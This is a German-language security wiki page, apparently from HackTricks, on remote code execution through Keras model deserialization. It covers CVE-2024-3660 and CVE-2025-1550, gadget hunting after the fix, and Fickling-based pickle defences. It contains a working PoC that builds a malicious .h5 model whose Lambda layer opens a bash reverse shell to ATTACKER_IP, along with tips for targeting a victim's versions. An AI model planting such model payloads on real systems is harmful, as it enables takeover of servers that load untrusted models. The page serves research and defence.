# Keras Model Deserialization RCE und Gadget Hunting

Diese Seite fasst praktische Exploitation-Techniken gegen die Keras Model Deserialization-Pipeline zusammen, erklärt die Interna und Angriffsfläche des nativen .keras-Formats und stellt ein Researcher-Toolkit zum Finden von Model File Vulnerabilities (MFVs) und Post-Fix-Gadgets bereit.

## Interna des .keras-Model-Formats

Eine .keras-Datei ist ein ZIP-Archiv, das mindestens Folgendes enthält:<sup>[[1]](#references)</sup>
- metadata.json – allgemeine Informationen (z. B. Keras-Version)
- config.json – Model-Architektur (primäre Angriffsfläche)
- model.weights.h5 – Weights im HDF5-Format

config.json steuert die rekursive Deserialization: Keras importiert Module, löst Klassen/Funktionen auf und rekonstruiert Layer/Objekte aus vom Angreifer kontrollierten Dictionaries.<sup>[[1]](#references)</sup>

Beispielausschnitt für ein Dense-Layer-Objekt:
```json
{
"module": "keras.layers",
"class_name": "Dense",
"config": {
"units": 64,
"activation": {
"module": "keras.activations",
"class_name": "relu"
},
"kernel_initializer": {
"module": "keras.initializers",
"class_name": "GlorotUniform"
}
}
}
```
Deserialization führt Folgendes aus:<sup>[[1]](#references)</sup>
- Import von Modulen und Auflösung von Symbolen anhand der Schlüssel `module`/`class_name`
- Aufruf von `from_config(...)` oder des Konstruktors mit vom Angreifer kontrollierten `kwargs`
- Rekursion in verschachtelte Objekte (`activations`, `initializers`, `constraints` usw.)

Historisch stellte dies einem Angreifer, der `config.json` erstellt, drei Primitive zur Verfügung:<sup>[[1]](#references)</sup>
- Kontrolle darüber, welche Module importiert werden
- Kontrolle darüber, welche Klassen/Funktionen aufgelöst werden
- Kontrolle über die an Konstruktoren/`from_config` übergebenen `kwargs`

## CVE-2024-3660 – Lambda-layer bytecode RCE

Ursache:
- Die Legacy-Lambda-Deserialisierung rekonstruierte eine Python-Funktion aus vom Angreifer kontrolliertem marshaled code: `func_load()` decodiert die Base64-Nutzlast, ruft `marshal.loads()` auf und erstellt einen `FunctionType`. Der Bytecode der resultierenden Funktion wird ausgeführt, wenn die Lambda aufgerufen wird, und betroffene Loader vor Version 2.13 setzten für Legacy-Formate keine safe-mode-Prüfungen durch.<sup>[[3]](#references)[[16]](#references)[[17]](#references)[[18]](#references)</sup>

In einem nativen Keras-v3-Archiv wird die Lambda-Funktion als `__lambda__`-Objekt dargestellt, dessen Feld `code` marshaled code in Base64-Kodierung enthält:<sup>[[17]](#references)[[18]](#references)</sup>
```json
{
"module": "keras.layers",
"class_name": "Lambda",
"config": {
"name": "exploit_lambda",
"function": {
"class_name": "__lambda__",
"config": {
"code": "<base64(marshal.dumps(function.__code__))>",
"defaults": null,
"closure": null
}
}
}
}
```
Mitigation:
- Keras erzwingt standardmäßig `safe_mode=True` für das native Keras-v3-Format. Serialisierte Python-Lambdas in `Lambda` werden blockiert, sofern ein Benutzer nicht ausdrücklich mit `safe_mode=False` darauf verzichtet; dieser Schutz deckt Legacy-Formate nicht auf dieselbe Weise ab.<sup>[[1]](#references)[[16]](#references)[[17]](#references)</sup>

Hinweise:
- Legacy-Formate (ältere HDF5-Speicherungen) oder ältere Codebasen erzwingen möglicherweise keine modernen Prüfungen, sodass Angriffe im „Downgrade“-Stil weiterhin funktionieren können, wenn Opfer ältere Loader verwenden.

## CVE-2025-1550 – Arbitrary module import in Keras 3.0.0–3.8.x

Ursache:
- `_retrieve_class_or_fn` verwendete `importlib.import_module(module)` für vom Angreifer kontrollierte Modul-Strings aus `config.json`.
- Auswirkung: Ein präpariertes `.keras`-Archiv konnte `Model.load_model()` dazu bringen, vom Angreifer ausgewählte Python-Module und -Funktionen zu importieren, einschließlich Side Effects beim Import und vom Angreifer kontrollierter Argumente, selbst bei `safe_mode=True`.<sup>[[1]](#references)[[4]](#references)</sup>

Exploit-Idee:
```json
{
"module": "maliciouspkg",
"class_name": "Danger",
"config": {"arg": "val"}
}
```
Sicherheitsverbesserungen (Keras ≥ 3.9):<sup>[[1]](#references)[[2]](#references)</sup>
- Module allowlist: imports auf offizielle ecosystem modules beschränkt: keras, keras_hub, keras_cv, keras_nlp
- Safe mode default: safe_mode=True blockiert das Laden unsicherer serialisierter Lambda-Funktionen
- Basic type checking: Deserialisierte Objekte müssen den erwarteten Typen entsprechen

## Praktische Ausnutzung: TensorFlow-Keras HDF5 (.h5) Lambda RCE

Legacy-TensorFlow-Keras-Deployments akzeptieren möglicherweise weiterhin HDF5-Modelldateien (`.h5`). Wenn ein Angreifer ein Model hochladen kann, das der Server später lädt oder für Inference verwendet, kann ein betroffener Loader eine Lambda-Schicht mit angreiferkontrolliertem Python deserialisieren, das anschließend im Model-Workflow der Anwendung ausgeführt werden kann.<sup>[[3]](#references)[[7]](#references)[[16]](#references)</sup>

Minimaler PoC zum Erstellen eines bösartigen .h5, dessen Lambda eine reverse shell ausführt, wenn das Ziel das Model aufruft:
```python
import tensorflow as tf

def exploit(x):
import os
os.system("bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1'")
return x

m = tf.keras.Sequential()
m.add(tf.keras.layers.Input(shape=(64,)))
m.add(tf.keras.layers.Lambda(exploit))
m.compile()
m.save("exploit.h5")  # legacy HDF5 container
```
Hinweise und Tipps zur Zuverlässigkeit:
- Trigger points variieren je nach Format und Workflow; der referenzierte Write-up beobachtete, dass die Payload während der Prediction zweimal ausgeführt wurde. Behandle Side Effects als wiederholbar und gestalte Payloads idempotent.<sup>[[7]](#references)</sup>
- Version pinning: Stimme die TF/Keras/Python-Versionen auf die des Opfers ab, um Serialisierungsfehler zu vermeiden. Erstelle beispielsweise Artifacts unter Python 3.8 mit TensorFlow 2.13.1, wenn das Ziel diese Version verwendet.<sup>[[7]](#references)</sup>
- Schnelle Replikation der Umgebung:
```dockerfile
FROM python:3.8-slim
RUN pip install tensorflow-cpu==2.13.1
```
- Validierung: Ein harmloses Payload wie `os.system("ping -c 1 YOUR_IP")` hilft, die Ausführung zu bestätigen (z. B. durch Beobachtung von ICMP mit tcpdump), bevor auf eine Reverse Shell gewechselt wird.<sup>[[7]](#references)</sup>

## Gadget-Oberfläche innerhalb der Allowlist nach dem Fix

Selbst mit der Keras-Modul-Allowlist und dem Safe Mode können erlaubte Callables Nebenwirkungen verursachen. Beispielsweise lädt `keras.utils.get_file` eine URL herunter und schreibt sie unter dem konfigurierten Cache-Speicherort, wodurch es für eine Gadget-Analyse infrage kommt.<sup>[[1]](#references)[[19]](#references)</sup>

Kandidatenkonfiguration für Lambda (die Call-Signatur in einem kontrollierten Test validieren):
```json
{
"module": "keras.layers",
"class_name": "Lambda",
"config": {
"name": "dl",
"function": {
"module": "keras.utils",
"class_name": "get_file",
"config": null,
"registered_name": null
},
"arguments": {
"origin": "https://example.com/artifact.bin",
"cache_dir": "/tmp/keras-cache"
}
}
}
```
Wichtige Einschränkung:
- `Lambda.call()` übergibt die Model-Eingabe immer als erstes Positionsargument und die konfigurierten `arguments` als Keyword-Argumente. Bei `get_file` füllt dieser Positionswert `fname`; ein Tensor/Path-Mismatch kann dazu führen, dass dieser Kandidat vor jedem Download fehlschlägt, daher ist es kein garantiert funktionierendes Gadget.<sup>[[1]](#references)[[16]](#references)[[19]](#references)</sup>

## ML-Pickle-Import-Allowlisting für AI/ML-Modelle (Fickling)

Viele AI/ML-Modellformate (PyTorch `.pt`/`.pth`/`.ckpt`, joblib/scikit-learn-Artefakte und andere Python-native Formate) enthalten Python-Pickle-Daten. Der oben beschriebene Legacy-Keras-Lambda-Pfad verwendet stattdessen marshaled Function-Bytecode und stellt daher ein separates Deserialisierungsrisiko dar. Pickle-Opcodes können während der Deserialisierung angreiferkontrolliertes Verhalten auslösen, einschließlich Manipulation von Modellen oder RCE, und einfache Scanner können neuartige oder nicht aufgelistete gefährliche Imports übersehen.<sup>[[7]](#references)[[8]](#references)[[14]](#references)[[18]](#references)</sup>

Eine praktische Fail-Closed-Abwehr besteht darin, den Pickle-Deserializer von Python zu hooken und während des Unpicklings nur eine geprüfte Menge harmloser ML-bezogener Imports zu erlauben. Fickling von Trail of Bits implementiert diese Richtlinie und enthält eine kuratierte ML-Import-Allowlist, die aus Tausenden öffentlichen Hugging-Face-Pickles erstellt wurde.<sup>[[8]](#references)[[13]](#references)</sup>

Sicherheitsmodell für „sichere“ Imports (aus Forschung und Praxis abgeleitete Grundgedanken): Von einem Pickle verwendete importierte Symbole müssen gleichzeitig:<sup>[[8]](#references)</sup>
- Keinen Code ausführen oder eine Ausführung verursachen (keine kompilierten/Quellcodeobjekte, kein Aufrufen von Shells, keine Hooks usw.)
- Keine beliebigen Attribute oder Elemente lesen oder setzen
- Keine anderen Python-Objekte aus der Pickle-VM importieren oder Referenzen darauf erlangen
- Keine sekundären Deserializer (z. B. marshal, verschachtelte Pickles) auslösen, auch nicht indirekt

Aktiviere Ficklings Schutzmechanismen so früh wie möglich beim Prozessstart, damit alle von Frameworks (`torch.load`, `joblib.load` usw.) durchgeführten Pickle-Ladevorgänge geprüft werden:<sup>[[9]](#references)</sup>
```python
import fickling
# Sets global hooks on the stdlib pickle module
fickling.hook.activate_safe_ml_environment()
```
Betriebliche Tipps:
- You can temporarily disable/re-enable the hooks where needed:<sup>[[9]](#references)</sup>
```python
fickling.hook.deactivate_safe_ml_environment()
# ... load fully trusted files only ...
fickling.hook.activate_safe_ml_environment()
```
- Wenn ein als vertrauenswürdig bekanntes Modell blockiert wird, erweitern Sie nach der Überprüfung der Symbole die Allowlist für Ihre Umgebung:<sup>[[9]](#references)</sup>
```python
fickling.hook.activate_safe_ml_environment(also_allow=[
"package.subpackage.safe_symbol",
"another.safe.import",
])
```
- Fickling stellt außerdem generische Runtime-Schutzmechanismen bereit, wenn du eine granularere Kontrolle bevorzugst:<sup>[[9]](#references)</sup>
- fickling.always_check_safety() erzwingt Prüfungen für alle pickle.load()
- with fickling.check_safety(): für eine auf einen bestimmten Bereich beschränkte Durchsetzung
- fickling.load(path) / fickling.is_likely_safe(path) für einmalige Prüfungen

- Bevorzuge nach Möglichkeit Nicht-Pickle-Modellformate (z. B. SafeTensors).<sup>[[15]](#references)</sup> Wenn du Pickle akzeptieren musst, führe Loader mit den geringstmöglichen Berechtigungen und ohne ausgehenden Netzwerkzugriff aus und erzwinge die Allowlist.

Diese Allowlist-first-Strategie blockiert nachweislich gängige ML-Pickle-Exploit-Pfade und erhält gleichzeitig eine hohe Kompatibilität. Im Benchmark von ToB erkannte Fickling 100 % der synthetisch schädlichen Dateien und erlaubte etwa 99 % der sauberen Dateien aus den führenden Hugging-Face-Repositories.<sup>[[8]](#references)[[10]](#references)</sup>


## Researcher-Toolkit

1) Systematische Gadget-Entdeckung in erlaubten Modulen

Zähle potenzielle Callables in keras, keras_nlp, keras_cv und keras_hub auf und priorisiere diejenigen mit Nebenwirkungen bei Dateien, Netzwerk, Prozessen oder Umgebungsvariablen.<sup>[[1]](#references)</sup>

<details>
<summary>Potenziell gefährliche Callables in Allowlist-Keras-Modulen aufzählen</summary>
```python
import importlib, inspect, pkgutil

ALLOWLIST = ["keras", "keras_nlp", "keras_cv", "keras_hub"]

seen = set()

def iter_modules(mod):
if not hasattr(mod, "__path__"):
return
for m in pkgutil.walk_packages(mod.__path__, mod.__name__ + "."):
yield m.name

candidates = []
for root in ALLOWLIST:
try:
r = importlib.import_module(root)
except Exception:
continue
for name in iter_modules(r):
if name in seen:
continue
seen.add(name)
try:
m = importlib.import_module(name)
except Exception:
continue
for n, obj in inspect.getmembers(m):
if inspect.isfunction(obj) or inspect.isclass(obj):
sig = None
try:
sig = str(inspect.signature(obj))
except Exception:
pass
doc = (inspect.getdoc(obj) or "").lower()
text = f"{name}.{n} {sig} :: {doc}"
# Heuristics: look for I/O or network-ish hints
if any(x in doc for x in ["download", "file", "path", "open", "url", "http", "socket", "env", "process", "spawn", "exec"]):
candidates.append(text)

print("\n".join(sorted(candidates)[:200]))
```
</details>

2) Direkte Deserialization-Tests (kein .keras-Archiv erforderlich)

Übergebe manipulierte Dicts direkt an Keras-Deserializers, um akzeptierte Parameter zu ermitteln und Seiteneffekte zu beobachten.<sup>[[1]](#references)</sup>
```python
import keras

cfg = {
"module": "keras.layers",
"class_name": "Lambda",
"config": {
"name": "probe",
"function": {
"module": "keras.utils",
"class_name": "get_file",
"config": null,
"registered_name": null
},
"arguments": {
"origin": "https://example.com/x",
"cache_dir": "/tmp/keras-cache"
}
}
}

layer = keras.saving.deserialize_keras_object(cfg, safe_mode=True)  # Observe behavior
```
3) Cross-version probing und Formate

Keras existiert in mehreren Codebases/Eras mit unterschiedlichen Schutzmechanismen und Formaten:<sup>[[1]](#references)</sup>
- TensorFlow built-in Keras: tensorflow/python/keras (legacy, zur Löschung vorgesehen)
- tf-keras: separat gepflegt
- Multi-backend Keras 3 (offiziell): führt das native .keras-Format ein

Wiederhole die Tests über Codebases und Formate hinweg (.keras gegenüber Legacy-HDF5), um Regressionen oder fehlende Schutzmechanismen aufzudecken.

## References

- [1] [Aufspüren von Schwachstellen bei der Deserialisierung von Keras-Modellen (huntr-Blog)](https://blog.huntr.com/hunting-vulnerabilities-in-keras-model-deserialization)
- [2] [Keras PR #20751 – Prüfungen zur Serialisierung hinzugefügt](https://github.com/keras-team/keras/pull/20751)
- [3] [CVE-2024-3660 – RCE durch Keras-Lambda-Deserialisierung](https://nvd.nist.gov/vuln/detail/CVE-2024-3660)
- [4] [CVE-2025-1550 – Beliebiger Modulimport in Keras (≤ 3.8)](https://nvd.nist.gov/vuln/detail/CVE-2025-1550)
- [5] [huntr-Bericht – beliebiger Import #1](https://huntr.com/bounties/135d5dcd-f05f-439f-8d8f-b21fdf171f3e)
- [6] [huntr-Bericht – beliebiger Import #2](https://huntr.com/bounties/6fcca09c-8c98-4bc5-b32c-e883ab3e4ae3)
- [7] [HTB Artificial – TensorFlow-.h5-Lambda-RCE bis root](https://0xdf.gitlab.io/2025/10/25/htb-artificial.html)
- [8] [Trail-of-Bits-Blog – Ficklings neuer AI/ML-Pickle-File-Scanner](https://blog.trailofbits.com/2025/09/16/ficklings-new-ai/ml-pickle-file-scanner/)
- [9] [Fickling – Absicherung von AI/ML-Umgebungen (README)](https://github.com/trailofbits/fickling#securing-aiml-environments)
- [10] [Fickling-Benchmark-Korpus für das Scannen von Pickles](https://github.com/trailofbits/fickling/tree/master/pickle_scanning_benchmark)
- [11] [Picklescan](https://github.com/mmaitre314/picklescan)
- [12] [ModelScan](https://github.com/protectai/modelscan)
- [13] [model-unpickler](https://github.com/goeckslab/model-unpickler)
- [14] [Hintergrund zu Sleepy-Pickle-Angriffen](https://blog.trailofbits.com/2024/06/11/exploiting-ml-models-with-pickle-file-attacks-part-1/)
- [15] [SafeTensors-Projekt](https://github.com/safetensors/safetensors)
- [16] [CERT/CC VU#253266 – Keras-2-Lambda-Layer ermöglichen beliebige Code-Injection](https://kb.cert.org/vuls/id/253266)
- [17] [Quellcode der Keras-Lambda-Layer (v3.10.0)](https://github.com/keras-team/keras/blob/v3.10.0/keras/src/layers/core/lambda_layer.py)
- [18] [Quellcode der Keras-Python-Utilities (v3.10.0)](https://github.com/keras-team/keras/blob/v3.10.0/keras/src/utils/python_utils.py)
- [19] [Keras-API für `get_file`](https://keras.io/api/utils/python_utils/#get_file-function)
{{#include ../../banners/hacktricks-training.md}}
